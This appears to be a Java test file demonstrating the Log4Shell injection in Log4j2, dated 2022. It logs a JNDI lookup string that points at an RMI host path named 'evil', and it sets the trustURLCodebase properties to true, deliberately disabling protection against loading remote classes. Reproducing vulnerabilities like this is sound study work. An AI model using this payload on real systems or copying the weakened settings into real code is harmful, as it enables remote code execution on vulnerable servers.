import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.NamingException;
import java.io.IOException;

/**
 * @Author chenjl
 * @Date 2022/5/28
 * @Version 1.0
 */
public class Log4j2Test {

    private static final Logger logger = LogManager.getLogger(Log4j2Test.class);

    public static void main(String[] args) throws IOException, NamingException {
        String username = "${jndi:rmi://192.168.1.2:1099/evil}";
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
//        String username = "${java:runtime}";
        logger.info("打印黑客远程输入的信息--- {}", username);
    }
}
